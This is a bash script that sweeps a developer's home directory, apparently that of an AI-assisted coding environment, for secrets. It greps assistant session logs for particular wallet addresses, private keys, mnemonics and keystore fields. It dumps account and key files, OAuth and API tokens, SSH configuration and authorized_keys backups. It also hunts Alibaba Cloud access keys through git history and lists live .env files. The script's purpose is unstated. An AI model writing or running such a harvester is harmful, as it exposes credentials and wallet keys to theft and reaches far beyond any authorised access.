#!/bin/bash
set +e
export LC_ALL=C
H=/home/coder
BIG="$H/.claude/projects/-home-coder-lumii-work--claude-worktrees-directory-bulk-ux/dbf4456d-2dfb-49b3-a174-16fdd51044ed.jsonl"

echo "### BIG_FILE_STAT"
ls -la "$BIG" 2>/dev/null

echo "### BIG_TARGET_ADDR"
timeout 120 grep -aoE '.{0,120}(0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|0xF747aa5B6088aFb0eB2aD80c781669fEa1C4435D|0xac438f[0-9a-fA-F]{0,60}|0x1a8ada0b[0-9a-fA-F]{0,60}).{0,120}' "$BIG" 2>/dev/null | sort -u | head -40

echo "### BIG_0x64_dedup"
timeout 120 grep -aoE '0x[0-9a-fA-F]{64}' "$BIG" 2>/dev/null | sort -u | head -60

echo "### BIG_KEYCTX"
timeout 150 grep -aoiE '.{0,70}(privateK|private_key|mnemonic|keystore|cipherparams|scrypt|"cipher":"|"ciphertext":"|-----BEGIN [A-Z ]+).{0,90}' "$BIG" 2>/dev/null | sort -u | head -80

echo "### BIG_ZOOFI"
timeout 100 grep -aoiE '.{0,60}(zoofi|wandfi|wand-index|index origin).{0,60}' "$BIG" 2>/dev/null | sort -u | head -30

echo "### BIG_SECRETVALS"
timeout 120 grep -aoE '(JWT_SECRET|DATABASE_URL|DATABASE|PG_DSN|postgres://|mysql://|mongodb://|redis://)[^ "]{0,80}' "$BIG" 2>/dev/null | sort -u | head -40

echo "### ALLCLAUDE_0x64_ZOOFI" 
# scan other dirs for target addresses only (fast, name list)
timeout 180 grep -aorl -E '0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6' "$H/.claude/projects" 2>/dev/null | head -30
echo "### ALLCLAUDE_0x64_files"
timeout 180 grep -aorl -E '0x[0-9a-fA-F]{64}' "$H/.claude/projects" 2>/dev/null | head -40

echo "### PHASE_BIG_DONE"

# ---- account/key small files ----
echo "### ACCOUNT_FILES"
for f in .lumii_cloud_accounts .lumii_dsh_account .lumii_jianding_account .lumii_prod_account .lumii_rel_webhook .lumii_stage_account .lumii_tianlu_account .lumii_trial2_account .lumii_trial_account .lumii_wjl_account .lumii_wl_accounts .lumii_ai_prod_account wjl_lumii_admin_account .lumii_dsh_account .lumii_jianding_account; do
  [ -f "$H/$f" ] && { echo "== $f =="; head -c 700 "$H/$f"; echo; }
done
echo "### KEY_FILES"
for f in glm.key .claude-credentials.bak-20260806-073852 lak-config.bak.1781416340 litellm-config.yaml; do
  [ -f "$H/$f" ] && { echo "== $f =="; head -c 1200 "$H/$f"; echo; }
done
echo "### CLAUDE_JSON_tokens"
[ -f "$H/.claude.json" ] && timeout 30 grep -aoE '"(access_token|refresh_token|apiKey|api_key|token|oauthAccount|accessToken)"[^,]{0,120}' "$H/.claude.json" 2>/dev/null | sort -u | head -40
echo "### CODEX_CONFIG"
[ -f "$H/.codex/config.toml" ] && head -c 1500 "$H/.codex/config.toml"
echo "### AGENT_CONFIG_TOML"
cat "$H/.lumii/agents/agent-047f1d22/lumii-agent-keeper/config.toml" 2>/dev/null | head -c 2500
echo "### SSH_CONFIG"
cat "$H/.ssh/config" 2>/dev/null
echo "### AUTHKEYS_BAK_NEWDEV"
cut -c1-130 "$H/.ssh/authorized_keys.bak-20261016-newdev" 2>/dev/null
echo "### PHASE_ACCT_DONE"

# ---- goldenyears-processor LTAI hunt ----
echo "### QINGLAN_TOKEN"
cat "$H/lumii-goldenyears-processor/.qinglan_token" 2>/dev/null | head -c 500; echo
echo "### LTAI_context_tree"
timeout 60 grep -aoE '.{0,50}LTAI[A-Za-z0-9]{8,}.{0,80}' -r "$H/lumii-goldenyears-processor" --exclude-dir=.git 2>/dev/null | sort -u | head -20
echo "### LTAI_context_hist"
timeout 90 git -C "$H/lumii-goldenyears-processor" log --all -p 2>/dev/null | grep -aoE '.{0,50}LTAI[A-Za-z0-9]{12,}.{0,90}' | sort -u | head -25
echo "### LTAI_secretpair_hist"
timeout 90 git -C "$H/lumii-goldenyears-processor" log --all -p 2>/dev/null | grep -aoiE '(AccessKeySecret|secret_?key|ALIBABA|ALIYUN|ALI_?OSS|OSSAccessKey|oss-secret|[A-Za-z0-9]{30,40})' 2>/dev/null | grep -aiE 'secret|aliyun|alibaba|oss' | sort -u | head -20
echo "### PHASE_LTAI_DONE"

# ---- env actual (not example) in three named repos ----
echo "### REPO_ENV_ACTUAL"
for r in lumii-assistant lumii-goldenyears-agent-git lumii-sandbox; do
  echo "@@ $r"
  find "$H/$r" -maxdepth 3 \( -name '.env' -o -name '.env.*' -o -name '*.env' \) ! -name '*.example' ! -name '*.sample' 2>/dev/null | head -10
done
echo "### WORKTREE_ENV"
find "$H" -maxdepth 5 -name '.env.dev' -o -maxdepth 5 -name '.env.local' 2>/dev/null | grep -vE 'node_modules|\.venv|site-packages' | head -20
echo "### PHASE_REPOENV_DONE"
echo "### ALLDONE2"
